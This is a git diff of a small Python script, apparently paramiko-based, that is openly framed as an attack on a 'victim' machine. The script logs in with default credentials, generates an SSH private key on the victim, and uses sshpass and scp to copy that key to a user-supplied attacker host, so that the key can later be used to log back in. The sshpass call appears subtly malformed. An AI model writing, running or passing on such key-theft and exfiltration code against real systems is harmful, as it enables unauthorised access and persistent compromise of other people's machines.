@@ -11,12 +11,40 @@ def ssh_command(ip, user, password, command, port=22):
     if session.active:
         print('Session Active')
         session.exec_command(command)
+
+        print(session.recv(2048))
     else:
         print('Session Failed')
 
 
 if __name__ == '__main__':
-    ssh_command('192.168.31.145', 'victim', 'victim', 'mkdir ~/Desktop/Mytest', 5555)
+    victim, attacker = {}, {}
+
+    print('[Victim]')
+    victim['ip'] = raw_input('ip: ')
+    victim['port'] = raw_input('port: ')
+    victim['name'] = raw_input('name: ')
+    victim['password'] = raw_input('password: ')
+
+    print('\n[Attacker]')
+    attacker['ip'] = raw_input('ip: ')
+    attacker['port'] = raw_input('port: ')
+    attacker['name'] = raw_input('name: ')
+    attacker['password'] = raw_input('password: ')
+
+    try:
+        print('Use victim/victim to ssh log into victim system')
+        command = 'ssh-keygen -f /home/victim/.ssh/victim_key -P 12345'
+        ssh_command(victim['ip'], 'victim', 'victim', command, int(victim['port']))
+
+        command = 'sshpass {0} scp /home/victim/.ssh/victim_key {1}@{2}:/home/{3}/victimKey'.format(attacker['password'], attacker['name'], attacker['ip'], attacker['name'])
+        ssh_command(victim['ip'], 'victim', 'victim', command, int(victim['port']))
+
+    except Exception as e:
+        print(e)
+        print('Use private key to ssh log into victim system')
+
+
 
 
 
